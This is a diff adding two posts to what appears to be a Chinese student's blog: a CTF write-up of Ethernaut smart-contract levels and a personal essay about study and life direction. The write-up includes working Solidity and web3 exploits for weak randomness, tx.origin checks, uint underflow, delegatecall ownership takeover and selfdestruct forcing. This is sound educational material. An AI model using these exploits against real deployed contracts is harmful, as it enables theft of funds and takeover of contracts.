@@ -168,6 +168,250 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://qst137.github.io/2024/08/30/2024-08-30-%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%A3%B9/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="QST137">
+      <meta itemprop="description" content="苍山岁岁有人去，唯愿洱海生白波。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="QST2's BLOG">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/08/30/2024-08-30-%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%A3%B9/" class="post-title-link" itemprop="url">区块链学习之壹</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2024-08-30 00:00:00" itemprop="dateCreated datePublished" datetime="2024-08-30T00:00:00+08:00">2024-08-30</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2024-09-15 15:02:41" itemprop="dateModified" datetime="2024-09-15T15:02:41+08:00">2024-09-15</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="区块链学习之壹"><a href="#区块链学习之壹" class="headerlink" title="区块链学习之壹"></a>区块链学习之壹</h1><h2 id="ethernaut-Coin-Flip"><a href="#ethernaut-Coin-Flip" class="headerlink" title="ethernaut - Coin Flip"></a>ethernaut - Coin Flip</h2><p>投币咯，我最喜欢的；</p>
+<p><strong>source</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line">    uint256 public consecutiveWins;</span><br><span class="line">    uint256 lastHash;</span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        consecutiveWins = 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line"></span><br><span class="line">        if (lastHash == blockValue) &#123;</span><br><span class="line">            revert();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        lastHash = blockValue;</span><br><span class="line">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">        bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">        if (side == _guess) &#123;</span><br><span class="line">            consecutiveWins++;</span><br><span class="line">            return true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            consecutiveWins = 0;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p> 随机的核心在于 <code>blockhash(block.number - 1)</code>；</p>
+<p>攻击原理是，如果在攻击合约中调用目标合约，就可以让两次调用在一个 block ，从而两次伪随机的结果相同；</p>
+<p>注意<code>lastHash == blockValue</code>是不允许的，这事实上限制了不能连续在同一 block 内调用<code>flip</code> ；</p>
+<p>解决方案是运行十次 exp ，而不是在 exp 中调用十次<code>flip</code>；</p>
+<p><strong>source of exp contract</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: GPL-3.0</span><br><span class="line"></span><br><span class="line">pragma solidity &gt;=0.8.2 &lt;0.9.0;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title Storage</span><br><span class="line"> * @dev Store &amp; retrieve value in a variable</span><br><span class="line"> * @custom:dev-run-script ./scripts/deploy_with_ethers.ts</span><br><span class="line"> */</span><br><span class="line"> </span><br><span class="line">// interface for instancing the problem contract</span><br><span class="line">interface CoinFlip &#123;</span><br><span class="line">    function flip(bool _guess) external returns (bool) ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// accacking contract</span><br><span class="line">contract Storage &#123;</span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line">    address instance = 0xb9A0C84D1C4a44322a141b401b95a69dCE386dC4;</span><br><span class="line">    uint256 lastHash;</span><br><span class="line">    CoinFlip con;</span><br><span class="line">    </span><br><span class="line">    function exp() public&#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line"></span><br><span class="line">        if (lastHash == blockValue) &#123;</span><br><span class="line">            revert();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // calculate which side</span><br><span class="line">        lastHash = blockValue;</span><br><span class="line">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">        bool side = coinFlip == 1 ? true : false;</span><br><span class="line">        </span><br><span class="line">        // call con.flip </span><br><span class="line">        con = CoinFlip(instance);</span><br><span class="line">        con.flip(side);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>部署合约，调十次 <code>exp</code> 即可；</p>
+<h3 id="使用-Remix-Injected-Provider-编写-attacking-contract"><a href="#使用-Remix-Injected-Provider-编写-attacking-contract" class="headerlink" title="使用 Remix - Injected Provider 编写 attacking contract"></a>使用 Remix - Injected Provider 编写 attacking contract</h3><p>一，写代码到<code>contracts/xxx.sol</code>，开启自动编译；</p>
+<p><img src="https://i.imgur.com/Wu8TWiZ.png"></p>
+<p><img src="https://i.imgur.com/0eofV8w.png"></p>
+<p>二，选择环境 <code>Injected Provider</code>，选择要部署的合约；</p>
+<p><img src="https://i.imgur.com/y6K2gag.png"></p>
+<p>三，部署；</p>
+<p><img src="https://i.imgur.com/FQMcmy6.png"></p>
+<p>四，调用<code>exp</code>函数；</p>
+<p><img src="https://i.imgur.com/ZGnM4Hx.png"></p>
+<p>这样就完成了一个简单 attacking contract 的部署到调用；</p>
+<h2 id="ethernaut-Telephone"><a href="#ethernaut-Telephone" class="headerlink" title="ethernaut - Telephone"></a>ethernaut - Telephone</h2><p><strong>source</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function changeOwner(address _owner) public &#123;</span><br><span class="line">        if (tx.origin != msg.sender) &#123;</span><br><span class="line">            owner = _owner;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="difference-between-msg-sender-tx-origin"><a href="#difference-between-msg-sender-tx-origin" class="headerlink" title="difference between msg.sender&amp;tx.origin"></a>difference between msg.sender&amp;tx.origin</h3><p><img src="https://img.learnblockchain.cn/attachments/2022/02/XyJFUGH5620dcb1e08bda.jpg"></p>
+<p>很直观了，<code>msg.sender</code>是功能的调用者，<code>tx.origin</code>调用功能的账户；</p>
+<h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><p>只需要用一个非<code>player</code>的合约调用<code>instance</code>即可；</p>
+<p><strong>exp source</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: GPL-3.0</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Telephone &#123;</span><br><span class="line">    function changeOwner(address _owner) external ;</span><br><span class="line">&#125;</span><br><span class="line">contract Attack &#123;</span><br><span class="line">    function exp() public &#123;</span><br><span class="line">        Telephone t = Telephone(0x7433a6f73fA68a0ED229e4164F4D6503ffF0a489);</span><br><span class="line">        t.changeOwner(tx.origin);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="ethernaut-Token"><a href="#ethernaut-Token" class="headerlink" title="ethernaut - Token"></a>ethernaut - Token</h2><p><strong>description</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//The goal of this level is for you to hack the basic token contract below.</span><br><span class="line"></span><br><span class="line">//You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.</span><br><span class="line"></span><br><span class="line">//  Things that might help:</span><br><span class="line"></span><br><span class="line">//What is an odometer?</span><br></pre></td></tr></table></figure>
+
+<p>要求把自己余额弄成一个很大的数；</p>
+<p><strong>source</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line">    mapping(address =&gt; uint256) balances;</span><br><span class="line">    uint256 public totalSupply;</span><br><span class="line"></span><br><span class="line">    constructor(uint256 _initialSupply) public &#123;</span><br><span class="line">        balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address _to, uint256 _value) public returns (bool) &#123;</span><br><span class="line">        require(balances[msg.sender] - _value &gt;= 0);</span><br><span class="line">        balances[msg.sender] -= _value;</span><br><span class="line">        balances[_to] += _value;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address _owner) public view returns (uint256 balance) &#123;</span><br><span class="line">        return balances[_owner];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="What-is-an-odometer"><a href="#What-is-an-odometer" class="headerlink" title="What is an odometer?"></a>What is an odometer?</h3><p>说实话没懂这个hint；</p>
+<h3 id="uint-overflow"><a href="#uint-overflow" class="headerlink" title="uint overflow"></a>uint overflow</h3><p><code>transfer</code> 表面上限制了余额不能为负数：<code>require(balances[msg.sender] - _value &gt;= 0)</code>；</p>
+<p>但是<code>balances</code>的键值实际上是<code>uint256</code>，查阅 <a target="_blank" rel="noopener" href="https://learnblockchain.cn/docs/solidity/types.html#id8">solidity 官方文档</a> 得知两点：</p>
+<ol>
+<li>“Solidity中的整数是有取值范围的。 例如 <code>uint32</code> 类型的取值范围是 <code>0</code> 到 <code>2 ** 32-1</code> 。 0.8.0 开始，算术运算有两个计算模式：一个是 “wrapping”（截断）模式或称 “unchecked”（不检查）模式，一个是”checked” （检查）模式。 默认情况下，算术运算在 “checked” 模式下，即都会进行溢出检查，如果结果落在取值范围之外，调用会通过 <a target="_blank" rel="noopener" href="https://learnblockchain.cn/docs/solidity/control-structures.html#assert-and-require">失败异常</a> 回退。 你也可以通过 <code>unchecked &#123; ... &#125;</code> 切换到 “unchecked”模式，更多可参考 <a target="_blank" rel="noopener" href="https://learnblockchain.cn/docs/solidity/control-structures.html#unchecked">unchecked</a> .”</li>
+<li>在 0.8.0 以前的版本（这里是 0.7.5）有这样的描述：“加法，减法和乘法具有通常的语义，值用两进制补码表示，意思是比如：<code>uint256（0） - uint256（1）== 2 ** 256 - 1</code> 。 我们在设计和编写智能合约时必须考虑到溢出问题。”</li>
+</ol>
+<p>题目环境为 <code>0.6.0</code> ，溢出问题存在，要搞大数字直接溢出即可；</p>
+<h3 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h3><p><strong>payload</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">transfer</span>(instance,<span class="number">21</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="ethernaut-Delegation"><a href="#ethernaut-Delegation" class="headerlink" title="ethernaut - Delegation"></a>ethernaut - Delegation</h2><p><strong>description</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// The goal of this level is for you to claim ownership of the instance you are given.</span><br><span class="line"></span><br><span class="line">  // Things that might help</span><br><span class="line"></span><br><span class="line">// Look into Solidity&#x27;s documentation on the delegatecall low level function, how it works, how it can be used to delegate operations to on-chain libraries, and what implications it has on execution scope.</span><br><span class="line">// Fallback methods</span><br><span class="line">// Method ids</span><br></pre></td></tr></table></figure>
+
+<p><strong>source</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Delegate &#123;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor(address _owner) &#123;</span><br><span class="line">        owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pwn() public &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Delegation &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    Delegate delegate;</span><br><span class="line"></span><br><span class="line">    constructor(address _delegateAddress) &#123;</span><br><span class="line">        delegate = Delegate(_delegateAddress);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external &#123;</span><br><span class="line">        (bool result,) = address(delegate).delegatecall(msg.data);</span><br><span class="line">        if (result) &#123;</span><br><span class="line">            this;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>部署的是<code>Delegation</code>，其回调函数的作用是进行一次<code>delegatecall</code>， 在<code>Delegate</code>中调用目标函数；</p>
+<p>直接尝试调用<code>pwn()</code>即可；</p>
+<p>而且这里涉及到<code>delegatecall</code>的特点，不改变交易属性，也就是<code>msg.sender</code>仍然是<code>player</code>自己；</p>
+<p>发起一个交易，将签名<code>data</code>改为<code>pwn()</code>的<code>keccak256</code>值的前四字节；</p>
+<p>傻逼 js <code>slice</code>的时候把<code>sha3</code>的结果看作字符串，因此取前四字节要取前十位，因为有<code>&quot;0x&quot;</code>；</p>
+<h3 id="题解-3"><a href="#题解-3" class="headerlink" title="题解"></a>题解</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">sendTransaction</span>(&#123;<span class="attr">data</span>:web3.<span class="property">utils</span>.<span class="title function_">sha3</span>(<span class="string">&quot;pwn()&quot;</span>).<span class="title function_">slice</span>(<span class="number">0</span>,<span class="number">10</span>)&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>注：solidity 的<code>keccak256</code>就是<code>sha3</code>；</p>
+<h2 id="ethernaut-Force"><a href="#ethernaut-Force" class="headerlink" title="ethernaut - Force"></a>ethernaut - Force</h2><p><strong>description</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// Some contracts will simply not take your money ¯\_(ツ)_/¯</span><br><span class="line"></span><br><span class="line">// The goal of this level is to make the balance of the contract greater than zero.</span><br><span class="line"></span><br><span class="line">  // Things that might help:</span><br><span class="line"></span><br><span class="line">// Fallback methods</span><br><span class="line">// Sometimes the best way to attack a contract is with another contract.</span><br><span class="line">// See the &quot;?&quot; page above, section &quot;Beyond the console&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>source</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Force &#123; /*</span><br><span class="line">                   MEOW ?</span><br><span class="line">         /\_/\   /</span><br><span class="line">    ____/ o o \</span><br><span class="line">    /~____  =ø= /</span><br><span class="line">    (______)__m_m)</span><br><span class="line">                   */ &#125;</span><br></pre></td></tr></table></figure>
+
+<p>给空合约发钱的问题，没有<code>receive()</code>也没有<code>callback()</code>；</p>
+<p>查阅官方文档：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">// 一个没有receive函数的合约，可以作为 coinbase 交易 （又名 矿工区块回报 ）的接收者或者作为 selfdestruct 的目标来接收以太币。</span><br></pre></td></tr></table></figure>
+
+<p>结合提示，尝试构建一个有<code>receive()</code>和<code>selfdestruct()</code>的合约，然后销毁之。</p>
+<h3 id="题解-4"><a href="#题解-4" class="headerlink" title="题解"></a>题解</h3><p><strong>exp source (GPT)</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    address payable target;</span><br><span class="line"></span><br><span class="line">    // 在部署时设置目标合约的地址</span><br><span class="line">    constructor(address payable _target) &#123;</span><br><span class="line">        target = _target;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 允许该合约接收以太币</span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    // 自毁合约并发送所有以太币到目标合约</span><br><span class="line">    function destroy() external payable &#123;</span><br><span class="line">        selfdestruct(target);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>部署之后向目标合约转账；</p>
+<p>然后调用<code>destroy()</code>，<code>getBalance()</code>后发现<code>instant</code>已经有余额；</p>
+<p>通！</p>
+<h2 id="你好"><a href="#你好" class="headerlink" title="你好"></a>你好</h2><p>好你；</p>
+<p>想起来小学有个大胖子，别人招惹他之后，他的口头禅是：</p>
+<p>”好你个……“</p>
+<p>小秦加油努力！</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://qst137.github.io/2024/04/02/2024-04-02-%E6%97%A2%E5%AE%9A%E7%9A%84%E6%9C%AA%E6%9D%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="QST137">
+      <meta itemprop="description" content="苍山岁岁有人去，唯愿洱海生白波。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="QST2's BLOG">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/04/02/2024-04-02-%E6%97%A2%E5%AE%9A%E7%9A%84%E6%9C%AA%E6%9D%A5/" class="post-title-link" itemprop="url">既定的未来</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2024-04-02 00:00:00" itemprop="dateCreated datePublished" datetime="2024-04-02T00:00:00+08:00">2024-04-02</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2024-09-15 04:12:11" itemprop="dateModified" datetime="2024-09-15T04:12:11+08:00">2024-09-15</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/misc/" itemprop="url" rel="index"><span itemprop="name">misc</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="既定的未来"><a href="#既定的未来" class="headerlink" title="既定的未来"></a>既定的未来</h1><p>凌晨陷入了恐怖的焦虑之中。大概来源于自己前一年半什么也没做，不知道自己兴趣在何处，不知道该干什么。</p>
+<p>大一上学期想保清北信工所深埋绩点之中，大一下学期疫情解封想多谈恋爱及时行乐毕业去二线城市躺平，大二上学期又阴差阳错地在<em><strong>太子港</strong></em>一个假期的 push 之下进了天璇，如此搭上了视野扩展的第一架桥。然而我是一个瞻前顾后的人，我不知道自己 CTF 能打多久，能打到什么程度，望着又不自信自己的智商，在新生赛证明了自己的智商，入围后却不知道学什么，繁乱的 WEB 技能树甚至不如实验班课程给我的吸引力大。弱智 Spring boot 学得我忘乎所以，项目的弱智后端做完了又去刷抖音，刷 b 站，打英雄联盟，转眼间一学期的时光就浪费掉了。我都不知道这到底是在奖励自己还是惩罚自己。</p>
+<p>到了这个寒假，在学长 push 之下帮忙写了点 wiki ，跟着看了两个 CTF ，几乎什么都不会，对题目的贡献无限趋近于0。我原谅了自己。颉夏青找我做一个看起来很牛逼的项目，于是我又搞上三四年前就废弃的机器学习了。学着包装 PPT ，给团队成员打鸡血，调试模型。我又觉得自己做事情了，于是又不学了。</p>
+<p>我会在沈阳和我的兄弟们随便找一个包间一打打一天麻将，赴约一场又一场，去体验二十多年的台球厅，和女兄弟、女兄弟的男闺蜜、男闺蜜的男 gay 蜜喝酒唱 K ，我会装醉跟女士拥抱，会装傻差点被女士拽到汉庭酒店，我在这些时间和空间肆意妄为，哈哈大笑，觉得这就是我的人生了——这人生好快乐——可这不是我的人生。</p>
+<p>从我记事儿以来我就没觉得我该这样过，我的理想一向是在某一个行当有所成就，这一般伴随着赚很多（对于我的认知来说很多）的钱。我只是累了，累得出奇。我不知道未来要做什么，不知道要学什么，不知道我会爱上什么样的人。恰恰我又读了自主性最强的 IT ，于是乎我只能为所有未来的可能性努力，什么都学，尝试接触身边所有可能爱上的人。人，至少我是不能这么用的。我超负荷了，什么也做不了了。</p>
+<p>不想谈 MBTI ，但我很早就是 sj 人了。这样的生活对 sj 人来说太绝望了。</p>
+<p>我一向是用心的眼睛盯着旁人才嗯那个有所前进，所幸我在滑落谷底的边缘遇到了三位目标明确行动坚定的人，三位在我的标准里可以托付至少半颗心的人。</p>
+<p>首先是大我两届的<em><strong>谷</strong></em>。此人一度给我一种非常神秘威严的感觉。直到上个假期我向他倾诉了一次，那过后我心里神秘威严的印象并未消解，但我觉得这个人是值得交付心情的，也是乐于收揽心情的。无论是方向上还是情绪上，都可以称之为我的直系学长。在我接触到下一个合适的人之前很长一段时间内，我需要间歇让他做我的引路人。我打心底里是崇拜他的，故他随便的一句认可或者建议都能消解我无数的云雾。</p>
+<p>二是我的好友<em><strong>古</strong></em>。此人和我一样傻逼。近日突然开始专注学一样东西，是我沙河图书馆的官方指定唯一搭子。好朋友间不至于对标，至少我看着同伴在努力，自己也没了摆烂的理由。</p>
+<p>三是<em><strong>忘</strong></em>。追她这件事让我第一次感受到从泛泛想象到清晰目标的转变给我带来的快感。更惊喜的是，她是一个未来规划很明确的人，还是一个努力的人。最重要的一点，我非常喜欢她，喜欢她身上的所有性格特质。我很幸运地被她喜欢了，她带给了我一场世界上最好的恋爱。这一场恋爱收束了我的心绪，我的心里有了未来的样子。很长一段时间内，我要围绕一件事情奋斗，我决定我要成功了。</p>
+<p><strong>我定好了学某个方向，进某个组，拿着这个组的丰厚经验胜利就业。</strong></p>
+<p>这是我最喜欢的节奏，它让我想到四五年前意气风发无所不能的我。那时候我的心里只有高考一件事，每天都在想着如何考进北师大的数学系，当时的方法也非常简单，多做题就行；至于现在如何去学，我要不断地问，没什么信息差，无外乎不停的努力。</p>
+<p>如今实验班退不掉了，我也欣然接受。同时我不再怀疑自己的智商。东隅已逝，桑榆非晚；我如今赤条条地面对这个世界，宣告一个巨大的阳谋，而不怕世界说我如何如何吹牛逼。</p>
+<p>未来无限可能，但是我马上二十岁了，应该选择一种去实现了。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
